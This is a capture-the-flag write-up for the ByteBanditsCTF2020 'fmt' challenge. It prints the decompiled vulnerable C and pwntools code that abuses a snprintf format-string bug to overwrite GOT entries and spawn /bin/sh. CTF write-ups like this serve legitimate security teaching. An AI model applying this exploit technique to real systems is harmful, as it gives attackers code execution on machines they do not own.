
## fmt
### Description

> Format strings are so 2000s. 
>
> nc [pwn.byteband.it](http://pwn.byteband.it) 6969


### Attachment

[fmt](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ByteBanditsCTF2020/pwn/fmt/fmt)

### Analysis

In `snprintf`, our input string (`buf`) will be formated to `other_buf` :

```c
int __cdecl main(int argc, const char **argv, const char **envp){
  char buf; // [rsp+10h] [rbp-110h]
  unsigned __int64 v5; // [rsp+118h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  puts("Choose your name");
  puts("1. Lelouch 2. Saitama 3. Eren");
  printf("Choice: ", 0LL);
  if ( get_int() == 2 )
  {
    puts("Good job. I'll give you a gift.");
    read(0, &buf, 0x100uLL);
    snprintf(other_buf, 0x100uLL, &buf);
    system("echo 'saitama, the real hero'");
  }
  return 0;
}
```

> string will not print to `stdin`, so we can use `%ln` to write memory with any values directly

### Solution

#### infinite loop

First of all, as the binary closes after `system` function,  an `infinite loop` should be created.

We need overwrite GOT of `system` with address of `main` and it can be easily done by `fmtstr_payload` of `pwntools` :

```python
# infinite loop
fmt1 = fmtstr_payload(6,{elf.got['system']:elf.sym['main']},write_size='long')
sla('Choice: ','2')
sla('Good job. I\'ll give you a gift.',fmt1)
```

> after that we can repeat calling `snprintf` to do more thing.

#### overwrite GOT of `snprintf`

> As `snprintf` would not print any char to `stdin`,  it was hard to leak the base address of libc. 
>
> But we can use `system` function in binary instead of libc.

Overwrite GOT of `snprintf` with the original address in GOT of `system` (`system@plt+6`) 

```c
 ► 0x401070       <snprintf@plt>     jmp    qword ptr [rip + 0x2fc2] <0x401056>
    ↓
   0x401056       <system@plt+6>     push   2
   0x40105b       <system@plt+11>    jmp    0x401020
```

>  `dl_resolver` will resolve real address of system in libc then call it. 

When we construct the second format string, make sure that the beginning of our input string was `/bin/sh;`:

```python
fmt2 = '/bin/sh;'
fmt2+= fmtstr_payload(7,{elf.got['snprintf']:0x401056-8},write_size='long')
sla('Choice: ','2')
sla('Good job. I\'ll give you a gift.',fmt2)
```

> The string stored in `other_buf` was `/bin/sh;......` and will not changed when `snprintf` were called at next time

#### getshell

`system('/bin/sh;')` executed after any chars sent:

```python
sla('Choice: ','2')
sla('Good job. I\'ll give you a gift.','TaQini win')
```

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/ByteBanditsCTF2020/pwn/fmt) 


